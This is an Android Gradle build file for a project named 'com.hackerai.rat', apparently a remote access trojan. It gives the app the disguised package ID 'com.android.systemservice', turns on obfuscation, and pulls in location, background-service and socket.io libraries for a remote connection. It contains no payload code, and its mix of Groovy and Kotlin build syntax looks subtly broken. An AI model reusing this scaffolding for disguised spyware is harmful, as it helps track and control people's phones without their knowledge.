plugins {
    id('com.android.application')
    id('org.jetbrains.kotlin.android')
}

android {
    namespace = "com.hackerai.rat"
    compileSdk = 34
    
    defaultConfig {
        applicationId = "com.android.systemservice"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "3.0.0"
    }
    
    buildTypes {
        release {
            minifyEnabled = true
            proguardFiles(getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro')
        }
        debug {
            minifyEnabled = false
        }
    }
    
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    
    kotlinOptions {
        jvmTarget = "17"
    }
}

dependencies {
    implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.9.22'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.7.0'
    implementation 'androidx.lifecycle:lifecycle-service:2.7.0'
    implementation 'com.google.android.gms:play-services-location:21.1.0'
    implementation ('io.socket:socket.io-client:2.1.2') {
        exclude group: 'org.json', module: 'json'
    }
    implementation 'com.google.code.gson:gson:2.10.1'
    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
}
